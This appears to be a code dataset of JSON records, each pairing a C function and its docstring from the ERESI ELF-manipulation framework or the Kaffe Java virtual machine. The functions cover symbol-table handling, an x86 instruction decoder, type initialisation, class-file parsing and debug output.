{"docstring": "/**\n * Called from elfsh_fixup_symtab\n * When trying to inject part of the libc, some bss symbols have a wrong sctndx \n * @param symtab\n * @return\n */\n", "func_signal": "elfshsect_t   *elfsh_fixup_sctndx(elfshsect_t *symtab)", "code": "{\n  int\t        index;\n  elfsh_Sym     *sym;\n  elfsh_SAddr\toffset;\n  elfsh_Shdr\t*shdr;\n  elfshsect_t\t*sct;\n\n  PROFILER_IN(__FILE__, __FUNCTION__, __LINE__);\n\n  //return (symtab); // XXX\n\n  sym = symtab->data;\n  shdr = symtab->parent->sht + symtab->index;\n\n  for (index = 0; index < shdr->sh_size / sizeof(elfsh_Sym); index++)\n  {\n    if (elfsh_get_symbol_link(sym + index) != SHN_COMMON)\n    {\n      if (elfsh_get_symbol_type(sym + index) == STT_SECTION)\n        continue;\n\n      sct = elfsh_get_parent_section(symtab->parent, \n                                     elfsh_get_symbol_value(sym + index), \n                                     &offset);\n\n      if (sct == NULL)\n      {\n        sct = elfsh_get_section_by_index(symtab->parent, \n                                         elfsh_get_symbol_link(sym + index), \n                                         NULL, \n                                         NULL);\n        if (sct && elfsh_get_section_type(sct->shdr) == SHT_NOBITS)\n        {\n\n#if\t__DEBUG_MAP__\n          printf(\" [*] Symbol [%s] sctndx changed from %u to SHN_COMMON\\n\", \n                 elfsh_get_symbol_name(symtab->parent, sym + index), \n                 elfsh_get_symbol_link(sym + index));\n#endif\n\n          elfsh_set_symbol_link(sym + index, SHN_COMMON);\n          continue;\n        }\n\n      }\n\n      if (sct && elfsh_get_section_type(sct->shdr) == SHT_NOBITS)\n      {\n        elfsh_set_symbol_link(sym + index, SHN_COMMON);\n#if\t__DEBUG_MAP__\t\t  \n        printf(\" [*] Symbol [%s] sctndx changed to SHN_COMMON\\n\", \n               elfsh_get_symbol_name(symtab->parent, sym + index));\n#endif\n      }\n    }\n  }\n  PROFILER_ROUT(__FILE__, __FUNCTION__, __LINE__, symtab);\n}", "path": "libelfsh\\map.c", "repo_name": "thorkill/eresi", "stars": 511, "license": "None", "language": "c", "size": 7039}
{"docstring": "/**\n * Rebuild the symtab with original names when possible \n */\n", "func_signal": "int\t\tmjr_symtab_rebuild(mjrsession_t *sess)", "code": "{\n int\t\tcn;\n int\t\tx;\n char\t\t**tab;\n container_t *tmp;\n mjrblock_t\t*n;\n char\t\ts[BSIZE];\n\n tab = hash_get_keys(&sess->cur->blkhash, &cn);\n for (x = 0; x < cn; x++) \n   {\n     tmp = hash_get(&sess->cur->blkhash, tab[x]);\n     n = tmp->data;\n\n     fprintf(D_DESC,\"[__DEBUG_MJOLLNIR__] mjr_symtab_rebuild: \"XFMT\" \\n\",\n\t     n->vaddr);\n\n     if (!mjr_block_funcstart(tmp))\n       continue;\n     snprintf(s, BSIZE, \"%s\"AFMT, \n\t      (char *) config_get_data(MJR_CONFIG_FUNC_PREFIX), n->vaddr);\n     mjr_symbol_add(sess, n->vaddr, s);\n   }\n return 1;\n}", "path": "libmjollnir\\src\\symtab.c", "repo_name": "thorkill/eresi", "stars": 511, "license": "None", "language": "c", "size": 7039}
{"docstring": "/** \n * @brief Rename symbol FIXME \n */\n", "func_signal": "int\t\tmjr_symbol_rename(mjrsession_t  *sess, \n\t\t\t\t  char\t\t*old_name, \n\t\t\t\t  char\t\t*new_name)", "code": "{\n  elfsh_Sym\t*sm;\n  \n  sm = elfsh_get_symbol_by_name(sess->cur->obj, old_name);\n  if (!sm)\n    return 0;\n  \n#if __DEBUG_MJOLLNIR__\n fprintf(D_DESC,\n\t \"[__DEBUG_MJOLLNIR__] mjr_symbol_rename: %s (st_value: 0x\"XFMT\") -> %s \\n\", \n\t old_name, sm->st_value, new_name);\n#endif\n \n mjr_symbol_add(sess, sm->st_value, new_name);\n mjr_symbol_delete_by_name(sess, old_name); \n elfsh_sync_sorted_symtab(sess->cur->obj->secthash[ELFSH_SECTION_SYMTAB]);\n return 1;\n}", "path": "libmjollnir\\src\\symtab.c", "repo_name": "thorkill/eresi", "stars": 511, "license": "None", "language": "c", "size": 7039}
{"docstring": "/**\n * Map in memory all ressources for this file \n * @param name\n * @return\n */\n", "func_signal": "elfshobj_t\t  *elfsh_map_obj(char *name)", "code": "{\n  elfshobj_t\t*file;\n\n  PROFILER_IN(__FILE__, __FUNCTION__, __LINE__);\n\n  file = elfsh_load_obj(name);\n  if (file == NULL)\n    PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, \n                 \"Unable to load object\", NULL);\n\n  file->rights = O_RDWR;\n\n  elfsh_read_obj(file);\n\n  hash_init(&file->redir_hash, \"redirections\", 51, ASPECT_TYPE_UNKNOW);\n\n  PROFILER_ROUT(__FILE__, __FUNCTION__, __LINE__, (file));\n}", "path": "libelfsh\\map.c", "repo_name": "thorkill/eresi", "stars": 511, "license": "None", "language": "c", "size": 7039}
{"docstring": "/**\n * @brief Get a va_list of parameters\n */\n", "func_signal": "static int\tparse_lookup_varlist(char *param, char *fmt, ...)", "code": "{\n  int\t\trc;\n  va_list\targ_ptr;\n\n  va_start(arg_ptr, fmt);\n  rc = vsscanf(param, fmt, arg_ptr);\n  va_end(arg_ptr);\n  return (rc);\n}", "path": "librevm\\lang\\grammar.c", "repo_name": "thorkill/eresi", "stars": 511, "license": "None", "language": "c", "size": 7039}
{"docstring": "/**\n *\n *\n <i386 func=\"i386_paddusb_pq_qq\" opcode=\"0xdc\"/>\n */\n", "func_signal": "int     i386_paddusb_pq_qq(asm_instr *new, u_char *opcode, u_int len,\n\t\t\t   asm_processor *proc)", "code": "{\n  new->ptr_instr = opcode;\n  new->len += 1;\n  new->instr = ASM_PADDUSB;\n\n#if LIBASM_USE_OPERAND_VECTOR\n  new->len += asm_operand_fetch(&new->op[0], opcode + 1, ASM_CONTENT_GENERAL, new);\n  new->len += asm_operand_fetch(&new->op[1], opcode + 1, ASM_CONTENT_ENCODED, new);\n  new->op[0].regset = ASM_REGSET_MM;\n  new->op[1].regset = ASM_REGSET_MM;\n#else\n  new->op[0].content = ASM_CONTENT_PMMX;\n  new->op[0].size = ASM_OSIZE_QWORD;\n  new->op[1].content = ASM_CONTENT_QMMX;\n  new->op[1].size = ASM_OSIZE_QWORD;\n\n  operand_rv_rmv(new, opcode + 1, len - 1, proc);\n  new->op[0].regset = ASM_REGSET_MM;\n  new->op[1].regset = ASM_REGSET_MM;\n#endif\n  return (new->len);\n}", "path": "libasm\\src\\arch\\ia32\\handlers\\i386_paddusb_pq_qq.c", "repo_name": "thorkill/eresi", "stars": 511, "license": "None", "language": "c", "size": 7039}
{"docstring": "/** \n * @brief Remove symbol by name \n */\n", "func_signal": "int\t\tmjr_symbol_delete_by_name(mjrsession_t *sess, char *symbol)", "code": "{ \n#if __DEBUG_MJOLLNIR__\n  fprintf(D_DESC,\"[__DEBUG_MJOLLNIR__] mjr_symbol_deleteByName: <%s>\\n\", symbol);\n#endif\n  \n  elfsh_remove_symbol(sess->cur->obj->secthash[ELFSH_SECTION_SYMTAB], symbol);\n  return 1;\n}", "path": "libmjollnir\\src\\symtab.c", "repo_name": "thorkill/eresi", "stars": 511, "license": "None", "language": "c", "size": 7039}
{"docstring": "/* Set a value in the jit section structure by name */\n", "func_signal": "static int setJITSectionValue(struct jit_section_data *jsd,\n\t\t\t      char *tag, char *value)", "code": "{\n\tint retval = 1;\n\n\tif( !strcmp(tag, \"precompile\") )\n\t{\n\t\tjsd->jsd_flags = parseFlagString(value,\n\t\t\t\t\t\t jsd->jsd_flags,\n\t\t\t\t\t\t JSDF_PRECOMPILE);\n\t}\n\telse if( !strcmp(tag, \"address\") )\n\t{\n\t\tvoid *addr;\n\n\t\tif( sscanf(value, \"%p\", &addr) != 1 )\n\t\t\tjsd->jsd_address = addr;\n\t\telse\n\t\t\tretval = 0;\n\t}\n\telse if( !strcmp(tag, \"size\") )\n\t{\n\t\tif( sscanf(value, \"%lu\", &jsd->jsd_size) != 1 )\n\t\t\tretval = 0;\n\t}\n\treturn( retval );\n}", "path": "kaffe\\xprof\\fileSections.c", "repo_name": "kaffe/kaffe", "stars": 408, "license": "gpl-2.0", "language": "c", "size": 196643}
{"docstring": "/*\n * Read in line numbers assocated with code.\n */\n", "func_signal": "bool\naddLineNumbers(Method* m, size_t len UNUSED, classFile* fp, errorInfo *info)", "code": "{\n\tlineNumbers* lines;\n\tint i;\n\tu2 nr;\n\tu2 data;\n\n\t/* no checkBufSize, done in caller (readAttributes) */\n\n\treadu2(&nr, fp);\n\n\tlines = gc_malloc(sizeof(lineNumbers)+sizeof(lineNumberEntry) * nr, KGC_ALLOC_LINENRTABLE);\n\tif (!lines) {\n\t  DBG(READCLASS,\n\t      dprintf(\"%s (%s): failed to allocate %lu bytes for %d line number table entries.\\n\",\n\t\t      CLASS_CNAME(m->class), m->name->data,\n\t\t      (unsigned long) sizeof(lineNumbers)+sizeof(lineNumberEntry) * nr,\n\t\t      nr);\n\t      );\n\n\t\tpostOutOfMemory(info);\n\t\treturn false;\n\t}\n\t\n\tlines->length = nr;\n\tfor (i = 0; i < nr; i++) {\n\t\treadu2(&data, fp);\n\t\tlines->entry[i].start_pc = data;\n\t\treadu2(&data, fp);\n\t\tlines->entry[i].line_nr = data;\n\t\tif (lines->entry[i].start_pc > m->c.bcode.codelen) {\n\t\t  DBG(READCLASS,\n\t\t      dprintf(\"%s (%s): start pc %lu of line number entry %d > method length %d.\\n\",\n\t\t\t      CLASS_CNAME(m->class), m->name->data,\n\t\t\t      (unsigned long) lines->entry[i].start_pc, i, m->c.bcode.codelen);\n\t\t      );\n\t\t\tpostExceptionMessage(info,\n\t\t\t\t\t     JAVA_LANG(ClassFormatError),\n\t\t\t\t\t     \"%s \"\n\t\t\t\t\t     \"(Method \\\"%s\\\" has invalid pc, \"\n\t\t\t\t\t     \"%ld, for line number %d)\",\n\t\t\t\t\t     CLASS_CNAME(m->class),\n\t\t\t\t\t     m->name->data,\n\t\t\t\t\t     (long)lines->entry[i].start_pc,\n\t\t\t\t\t     lines->entry[i].line_nr);\n\t\t\treturn false;\n\t\t}\n\t}\n\n\t/* Attach lines to method */\n\tm->lines = lines;\n\treturn true;\n}", "path": "kaffe\\kaffevm\\code.c", "repo_name": "kaffe/kaffe", "stars": 408, "license": "gpl-2.0", "language": "c", "size": 196643}
{"docstring": "/*\n * Intialise the internal types.\n */\n", "func_signal": "void\ninitTypes(void)", "code": "{\n\tDBG(INIT, dprintf(\"initTypes()\\n\"); );\n\n\tinitPrimClass(&byteClass, \"byte\", 'B', 1);\n\tinitPrimClass(&shortClass, \"short\", 'S', 2);\n\tinitPrimClass(&intClass, \"int\", 'I', 4);\n\tinitPrimClass(&longClass, \"long\", 'J', 8);\n\tinitPrimClass(&booleanClass, \"boolean\", 'Z', 1);\n\tinitPrimClass(&charClass, \"char\", 'C', 2);\n\tinitPrimClass(&floatClass, \"float\", 'F', 4);\n\tinitPrimClass(&doubleClass, \"double\", 'D', 8);\n\tinitPrimClass(&voidClass, \"void\", 'V', 0);\n\n\tTYPE_CLASS(TYPE_Boolean) = booleanClass;\n\tTYPE_CLASS(TYPE_Char) = charClass;\n\tTYPE_CLASS(TYPE_Float) = floatClass;\n\tTYPE_CLASS(TYPE_Double) = doubleClass;\n\tTYPE_CLASS(TYPE_Byte) = byteClass;\n\tTYPE_CLASS(TYPE_Short) = shortClass;\n\tTYPE_CLASS(TYPE_Int) = intClass;\n\tTYPE_CLASS(TYPE_Long) = longClass;\n\n#if defined(KAFFE_XDEBUGGING)\n\tbyteClass->stab_id = STYPE_BYTE;\n\tshortClass->stab_id = STYPE_SHORT;\n\tintClass->stab_id = STYPE_INT;\n\tlongClass->stab_id = STYPE_LONG;\n\tbooleanClass->stab_id = STYPE_BOOLEAN;\n\tcharClass->stab_id = STYPE_CHAR;\n\tfloatClass->stab_id = STYPE_FLOAT;\n\tdoubleClass->stab_id = STYPE_DOUBLE;\n\tvoidClass->stab_id = STYPE_VOID;\n#endif\n\t\n\tDBG(INIT, dprintf(\"initTypes() done\\n\"); );\n}", "path": "kaffe\\kaffevm\\itypes.c", "repo_name": "kaffe/kaffe", "stars": 408, "license": "gpl-2.0", "language": "c", "size": 196643}
{"docstring": "/* return register number that contains return address if function at\n   pc is a frame-less procedure.  Else return -1. */\n", "func_signal": "int\n__alpha_ra (uintp pc)", "code": "{\n    int *p;\n    int reg;\n\n    for (p = (int *)pc; ; p++) {\n\tif ((*p & ~(0x1F << 16)) == 0x6be08001) {\n\t    /* ret $31,($REG),1 */\n\t    reg = (*p >> 16) & 0x1F;\n\t    return reg;\n\t}\n\n\tif ((*p & 0xffff0000) == ((0x8 << 26) | ((30 & 0x1f) << 21) | ((30 & 0x1f) << 16))) {\n\t    /* lda $sp,N($sp) or lda $sp,-N($sp) */\n\t    return -1;\n\t}\n\n\tif ((*p & ~(0xFF << 13)) == 0x43c0141e) {\n\t    /* addq $sp,N,$sp */\n\t    /* epilogue: frame cleanup */\n\t    return -1;\n\t}\n\n\tif ((*p & ~(0xFF << 13)) == 0x43c0153e) {\n\t    /* subq $sp,N,$sp */\n\t    /* prologue: frame allocation */\n\t    return -1;\n\t}\n    }\n}", "path": "config\\alpha\\alpha.c", "repo_name": "kaffe/kaffe", "stars": 408, "license": "gpl-2.0", "language": "c", "size": 196643}
{"docstring": "/*\n * Finish the internal types.\n */\n", "func_signal": "void\nfinishTypes(void)", "code": "{\n\tDBG(INIT, dprintf(\"finishTypes()\\n\"); );\n\n\tbyteClass->head.vtable = getClassVtable();\n\tshortClass->head.vtable = getClassVtable();\n\tintClass->head.vtable = getClassVtable();\n\tlongClass->head.vtable = getClassVtable();\n\tbooleanClass->head.vtable = getClassVtable();\n\tcharClass->head.vtable = getClassVtable();\n\tfloatClass->head.vtable = getClassVtable();\n\tdoubleClass->head.vtable = getClassVtable();\n\tvoidClass->head.vtable = getClassVtable();\n\n\tDBG(INIT, dprintf(\"finishTypes() done\\n\"); );\n}", "path": "kaffe\\kaffevm\\itypes.c", "repo_name": "kaffe/kaffe", "stars": 408, "license": "gpl-2.0", "language": "c", "size": 196643}
{"docstring": "/* Write out the current value of a jit attribute */\n", "func_signal": "static int writeJITSectionValue(struct jit_section_data *jsd,\n\t\t\t\tstruct parse_state *ps,\n\t\t\t\tchar *tag, char *value,\n\t\t\t\tFILE *out_file)", "code": "{\n\tchar scratch[128];\n\tint retval = 1;\n\n\t/*\n\t * Figure out which attribute we're processing and construct the new\n\t * value\n\t */\n\tif( !tag )\n\t{\n\t\ttag = \"\";\n\t\tvalue = \"\";\n\t}\n\telse if( !strcmp(tag, \"precompile\") )\n\t{\n\t\tvalue = makeFlagString(jsd->jsd_flags, JSDF_PRECOMPILE, value);\n\t}\n\telse if( !strcmp(tag, \"size\") )\n\t{\n\t\tsprintf(scratch, \"%lu\", jsd->jsd_size);\n\t\tvalue = scratch;\n\t}\n\telse if( !strcmp(tag, \"address\") )\n\t{\n\t\tsprintf(scratch, \"%p\", jsd->jsd_address);\n\t\tvalue = scratch;\n\t}\n\t/*\n\t * parseSectionLine will do the actual writing so its formatted\n\t * correctly\n\t */\n\tretval = parseSectionLine(ps, &tag, &value, out_file);\n\treturn( retval );\n}", "path": "kaffe\\xprof\\fileSections.c", "repo_name": "kaffe/kaffe", "stars": 408, "license": "gpl-2.0", "language": "c", "size": 196643}
{"docstring": "/*\n * When debugging, printf should use fprintf() to avoid\n * threading/blocking problems.\n */\n", "func_signal": "int\nkaffe_dprintf(const char *fmt, ...)", "code": "{\n\n\tint n;\n\tsize_t max;\n\tva_list args;\n\tssize_t w = 0;\n\tint rc;\n\n\tva_start(args, fmt);\n\tif (!debugBuffer)\n\t\tdebugBuffer = malloc(bufferSz);\n\n#ifdef HAVE_VSNPRINTF\n\tmax = bufferSz - bufferBegin - 1;\n\tassert(max > 0);\n\tn = vsnprintf(debugBuffer + bufferBegin, max, fmt, args);\n\n\t/* The return value is bytes *needed* not bytes *used* */\n\tif (n > 0 && (size_t )n > max)\n\t\tn = max;\n#else\n\tn = vsprintf(debugBuffer + bufferBegin, fmt, args);\n#endif\n\tbufferBegin += n;\n\tassert(bufferBegin < bufferSz);/* XXX */\n\n\tif (bufferOutput) {\n\t\tif (bufferBegin >= (bufferSz - 60))\n\t\t\tbufferBegin = 0;\n\t} else {\n\t\t/* Keep trying to write.  Should we pause(), or\n\t\t * sigsuspend(), or do something based on config\n\t\t * defintions?\n\t\t */\n\t\tmax = 0;\n\t\twhile (max < (size_t) n) {\n                        w = write(kaffe_dprintf_fd,\n                                       debugBuffer + max,\n                                       (size_t)n - max);\n\t\t\trc = errno;\n\n\t\t\tif (w >= 0)\n\t\t\t\t/* ignore errors */\n\t\t\t\tmax += w;\n\t\t\telse if (rc != SIGINT)\n\t\t\t  {\n\t\t            /* Stderr should have been closed by another thread.\n\t\t\t     * We may only exit without printing anything.\n\t\t\t     */\n\t\t\t    break;\n\t\t\t  }\n\t\t\t  \n\t\t}\n\t\tbufferBegin = 0;\n\t}\n\tva_end(args);\n\n\treturn n;\n}", "path": "kaffe\\kaffevm\\debug.c", "repo_name": "kaffe/kaffe", "stars": 408, "license": "gpl-2.0", "language": "c", "size": 196643}
{"docstring": "/*\n * Get a class by name from loader 'loader'\n * Fails if there are extraneous characters as in \"Ljava/lang/Object;V\"\n *\n * To be used if \"sig\" contains exactly one class name.\n */\n", "func_signal": "Hjava_lang_Class*\ngetClassFromSignature(const char* sig, Hjava_lang_ClassLoader* loader, errorInfo *einfo)", "code": "{\n\tconst char *const sig0 = sig;\n\tHjava_lang_Class *cls = classFromSig(&sig, loader, einfo);\n\n\t/* name must consume all characters in string */\n\tif (cls != NULL && *sig == '\\0') {\n\t\treturn (cls);\n\t}\n\t/* \n\t * or rather VerifyError?  It could be a malformed sig in a malformed\n\t * .class file, or it could be a malformed user input from \n\t * Class.forName()\n\t */\n\tpostExceptionMessage(einfo, JAVA_LANG(NoClassDefFoundError), \"%s\", sig0);\n\treturn (NULL);\n}", "path": "kaffe\\kaffevm\\itypes.c", "repo_name": "kaffe/kaffe", "stars": 408, "license": "gpl-2.0", "language": "c", "size": 196643}
{"docstring": "/*\n * initialize debugging system\n */\n", "func_signal": "static void\ndebugSysInit(void)", "code": "{\n\tstatic int once = 0;\n\n\tif (once) return;\n\tonce = 1;\n#if defined(TRANSLATOR) && defined(KAFFE_VMDEBUG)\n\t{\n\t\tif (getenv(\"JIT_DEBUG\"))\n\t\t\tjit_debug = 1;\n\t}\n#endif /*  defined(TRANSLATOR) && defined(KAFFE_VMDEBUG) */\n\tatexit(debugExitHook);\n}", "path": "kaffe\\kaffevm\\debug.c", "repo_name": "kaffe/kaffe", "stars": 408, "license": "gpl-2.0", "language": "c", "size": 196643}
{"docstring": "/**\n * Return a primitive class for a given signature.\n *\n * @param sig signature (V,I,Z,S,B,C,F,D,J)\n *\n * @return primitive class corresponding to signature, otherwise NULL.\n */\n", "func_signal": "Hjava_lang_Class*\ngetPrimitiveClassFromSignature(const char sig)", "code": "{\n\tswitch(sig) {\n\tcase 'V': return (voidClass);\n\tcase 'I': return (intClass);\n\tcase 'Z': return (booleanClass);\n\tcase 'S': return (shortClass);\n\tcase 'B': return (byteClass);\n\tcase 'C': return (charClass);\n\tcase 'F': return (floatClass);\n\tcase 'D': return (doubleClass);\n\tcase 'J': return (longClass);\n\tdefault:\n\t\treturn NULL;\n\t}\n}", "path": "kaffe\\kaffevm\\itypes.c", "repo_name": "kaffe/kaffe", "stars": 408, "license": "gpl-2.0", "language": "c", "size": 196643}
{"docstring": "/*\n * Everything from this point to Kaffe_GetVersion is not\n * exception-aware.  Asynchronous exceptions should not be delivered\n * to them.\n *\n * Everything from Kaffe_GetVersion to Kaffe_GetJavaVM\n * should be bracketed with BEGIN and END _EXCEPTION_HANDLING.\n */\n", "func_signal": "void NONRETURNING\nKaffeJNI_FatalError(JNIEnv* env UNUSED, const char* mess)", "code": "{\n\tkprintf(stderr, \"FATAL ERROR: %s\\n\", mess);\n\tabort();\n}", "path": "kaffe\\kaffevm\\jni\\jni.c", "repo_name": "kaffe/kaffe", "stars": 408, "license": "gpl-2.0", "language": "c", "size": 196643}
{"docstring": "/* defined(KAFFE_VMDEBUG) */\n", "func_signal": "void\nKaffeJIT3_establishConstants(void *at)", "code": "{\n\tconstpool *c;\n\n\tassert(at != 0);\n\nDBG(MOREJIT, fprintf(stderr, \"Method Constant Pool:\\n\"));\n\tfor (c = firstConst; c != currConst; c = c->next) {\n\t\tc->at = (uintp)at;\n\t\t*(union _constpoolval*)at = c->val;\nDBG(MOREJIT,\tprintConstant(stderr, c));\n\t\tat = (void*)(((uintp)at) + sizeof(c->val));\n\t}\n}", "path": "kaffe\\kaffevm\\jit3\\constpool.c", "repo_name": "kaffe/kaffe", "stars": 408, "license": "gpl-2.0", "language": "c", "size": 196643}
{"docstring": "/* Don't waste space with the debugging functions */\n", "func_signal": "void dbgSetMask(debugmask_t UNUSED m)", "code": "{ }\nint dbgSetMaskStr(const char UNUSED *s) { return 0; }\n\n#else /* Actually define the functions */\n/* --- Debugging is enabled --- */\n\n/* Defines what debugging output is seen. Needs to be 64-bit. */\nstatic debugmask_t kaffevmDebugMask = DEFAULT_DEBUG_MASK;\n\n/**\n * Get the debug mask. \n *\n * The debug mask defines what kind of\n * debugging output is enabled or disabled.\n *\n * @return current debug mask\n */\ndebugmask_t\ndbgGetMask(void)\n{\n\treturn kaffevmDebugMask;\n}", "path": "kaffe\\kaffevm\\debug.c", "repo_name": "kaffe/kaffe", "stars": 408, "license": "gpl-2.0", "language": "c", "size": 196643}
{"docstring": "/*\n * Process program's flags.\n */\n", "func_signal": "static\nint\noptions(int argc, char** argv)", "code": "{\n\tint i;\n\n\n\tchar * bootclasspath = NULL;\n\tchar * classpath = NULL;\n\n\tbootclasspath = malloc(1);\n\tif (bootclasspath == NULL) \n\t  {\n\t    fprintf(stderr, \"%s\", _(\"Error: out of memory.\\n\"));\n\t    exit(EXIT_FAILURE);\n\t  }\n\t*bootclasspath = '\\0';\n\n\tclasspath = malloc(1);\n\tif (classpath == NULL) \n\t  {\n\t    fprintf(stderr, \"%s\",  _(\"Error: out of memory.\\n\"));\n\t    exit(EXIT_FAILURE);\n\t  }\n\t*classpath = '\\0';\n\n\tfor (i = 1; i < argc; i++) {\n\t\tif (argv[i][0] != '-') {\n\t\t\tbreak;\n\t\t}\n\n\t\tif (strcmp(argv[i], \"-help\") == 0) {\n\t\t\tusage();\n\t\t\texit(0);\n\t\t}\n\t\telse if (strcmp(argv[i], \"-version\") == 0) {\n\t\t\tdprintf(\"Kaffeh Stub Generator\\n\");\n\t\t\tdprintf(\"Copyright (c) 1996, 1997\\nTransvirtual Technologies, Inc.  All rights reserved\\n\");\n\n\t\t\tdprintf(\"Version: %s\\n\", PACKAGE_VERSION);\n\t\t\texit(0);\n\t\t}\n\t\telse if (strcmp(argv[i], \"-base\") == 0) {\n\t\t\tflag_shrt = 1;\n\t\t}\n\t\telse if (strcmp(argv[i], \"-jni\") == 0) {\n\t\t\tflag_jni = 1;\n\t\t}\n#ifdef KAFFE_VMDEBUG\n\t\telse if (strcmp(argv[i], \"-Xdebug\") == 0) {\n\t\t\ti++;\n\t\t\tdbgSetMaskStr(argv[i]);\n\t\t}\n#endif /*KAFFE_VMDEBUG*/\n\t\telse if (strcmp(argv[i], \"-classpath\") == 0) {\n\t\t  char * newcp;\n\t\t  size_t cplen;\n\n\t\t  i++;\n\n\t\t  cplen = strlen(classpath)\n\t\t    + strlen(argv[i])\n\t\t    + strlen(path_separator)\n\t\t    + 1;\n\n\t\t  newcp = malloc(cplen);\n\t\t  if (newcp == NULL)\n\t\t    {\n\t\t      fprintf(stderr, \"%s\", _(\"Error: out of memory.\\n\"));\n\t\t      exit(EXIT_FAILURE);\n\t\t    }\n\t\t  \n\t\t  strcpy(newcp, classpath);\n\t\t  strcat(newcp, path_separator);\n\t\t  strcat(newcp, argv[i]);\n\n\t\t  free(classpath);\n\t\t  classpath = newcp;\n\t\t}\n\t\telse if (strcmp(argv[i], \"-bootclasspath\") == 0) {\n\t\t  char * newcp;\n\t\t  size_t cplen;\n\n\t\t  i++;\n\n\t\t  cplen = strlen(bootclasspath)\n\t\t    + strlen(argv[i])\n\t\t    + strlen(path_separator)\n\t\t    + 1;\n\n\t\t  newcp = malloc(cplen);\n\t\t  if (newcp == NULL)\n\t\t    {\n\t\t      fprintf(stderr, \"%s\", _(\"Error: out of memory.\\n\"));\n\t\t      exit(EXIT_FAILURE);\n\t\t    }\n\t\t  \n\t\t  strcpy(newcp, bootclasspath);\n\t\t  strcat(newcp, path_separator);\n\t\t  strcat(newcp, argv[i]);\n\n\t\t  free(bootclasspath);\n\t\t  bootclasspath = newcp;\n\t\t}\n\t\telse if (strcmp(argv[i], \"-o\") == 0) {\n\t\t\ti++;\n\t\t\toutputName = argv[i];\n\t\t}\n\t\telse if (strcmp(argv[i], \"-d\") == 0) {\n\t\t\ti++;\n\t\t\tdirectoryName = argv[i];\n\t\t}\n\t\telse if (strcmp(argv[i], \"-force\") == 0) {\n\t\t  /* ignore the flag, since kaffeh overwrites\n\t\t   * the output file in any case.\n\t\t   */\n\t\t}\n\t\telse {\n\t\t\tdprintf(\"Unknown flag: %s\\n\", argv[i]);\n\t\t}\n\t}\n\n\n\tif (strlen(bootclasspath) > 0) \n\t  {\n\t    strcpy(realClassPath, bootclasspath);\n\t  } \n\n\tfree(bootclasspath);\n\n\tif (strlen(classpath) > 0)\n\t  {\n\t    strcat(realClassPath, classpath);\n\t  }\n\n\tfree(classpath);\n\n\t/* Return first no-flag argument */\n\treturn (i);\n}", "path": "kaffe\\kaffeh\\main.c", "repo_name": "kaffe/kaffe", "stars": 408, "license": "gpl-2.0", "language": "c", "size": 196643}
{"docstring": "/* Write out the current value of a jit attribute */\n", "func_signal": "static int writeLibSectionValue(struct lib_section_data *lsd,\n\t\t\t\tstruct parse_state *ps,\n\t\t\t\tchar *tag, char *value,\n\t\t\t\tFILE *out_file)", "code": "{\n\tint retval = 1;\n\n\t/*\n\t * Figure out which attribute we're processing and construct the new\n\t * value\n\t */\n\tif( !tag )\n\t{\n\t\ttag = \"\";\n\t\tvalue = \"\";\n\t}\n\telse if( !strcmp(tag, \"preload\") )\n\t{\n\t\tvalue = makeFlagString(lsd->lsd_flags, LSDF_PRELOAD, value);\n\t}\n\t/*\n\t * parseSectionLine will do the actual writing so its formatted\n\t * correctly\n\t */\n\tretval = parseSectionLine(ps, &tag, &value, out_file);\n\treturn( retval );\n}", "path": "kaffe\\xprof\\fileSections.c", "repo_name": "kaffe/kaffe", "stars": 408, "license": "gpl-2.0", "language": "c", "size": 196643}
{"docstring": "/* Set a value in the lib section structure by name */\n", "func_signal": "static int setLibSectionValue(struct lib_section_data *lsd,\n\t\t\t      char *tag, char *value)", "code": "{\n\tint retval = 1;\n\n\tif( !strcmp(tag, \"preload\") )\n\t{\n\t\tlsd->lsd_flags = parseFlagString(value,\n\t\t\t\t\t\t lsd->lsd_flags,\n\t\t\t\t\t\t LSDF_PRELOAD);\n\t}\n\treturn( retval );\n}", "path": "kaffe\\xprof\\fileSections.c", "repo_name": "kaffe/kaffe", "stars": 408, "license": "gpl-2.0", "language": "c", "size": 196643}
{"docstring": "/*\n * Print usage message.\n */\n", "func_signal": "static\nvoid\nusage(void)", "code": "{\n\tdprintf(\"usage: kaffeh [-options] class ...\\n\");\n\tdprintf(\"Options are:\\n\");\n\tdprintf(\"\t-help\t\t\tPrint this message\\n\");\n\tdprintf(\"\t-version\t\tPrint version number\\n\");\n\tdprintf(\"\t-classpath <path>\tSet classpath\\n\");\n\tdprintf(\"\t-bootclasspath <path>\tSet classpath\\n\");\n\tdprintf(\"\t-jni\t\t\tGenerate JNI interface\\n\");\n#ifdef KAFFE_VMDEBUG\n\tdprintf(\"\t-Xdebug <opts>\t\tKaffe debug options.\\n\");\n#endif /*KAFFE_VMDEBUG*/\n\tdprintf(\"\t-o <file>\t\tGenerate all output to the given file\\n\");\n\tdprintf(\"\t-d <directory>\t\tDirectory for the output\\n\");\n\tdprintf(\"Compatibility options:\\n\");\n\tdprintf(\"\t-force\t\t\tAlways (over)write output file\\n\");\n}", "path": "kaffe\\kaffeh\\main.c", "repo_name": "kaffe/kaffe", "stars": 408, "license": "gpl-2.0", "language": "c", "size": 196643}
{"docstring": "/*\n * Like getClassFromSignature, except don't check that there are no\n * extraneous characters after a parsed name.\n *\n * Can be used if \"sig\" is a pointer in a signature, i.e., is a signature part.\n */\n", "func_signal": "Hjava_lang_Class*\ngetClassFromSignaturePart(const char* sig, Hjava_lang_ClassLoader* loader, errorInfo *einfo)", "code": "{\n\tHjava_lang_Class *cls = classFromSig(&sig, loader, einfo);\n\n\t/* If class has been found, return it. */\n\tif (cls != NULL) {\n\t\treturn cls;\n\t}\n\n\t/* Otherwise, post an exception message. */\n\tpostException(einfo, JAVA_LANG(VerifyError));\n\treturn (NULL);\n}", "path": "kaffe\\kaffevm\\itypes.c", "repo_name": "kaffe/kaffe", "stars": 408, "license": "gpl-2.0", "language": "c", "size": 196643}
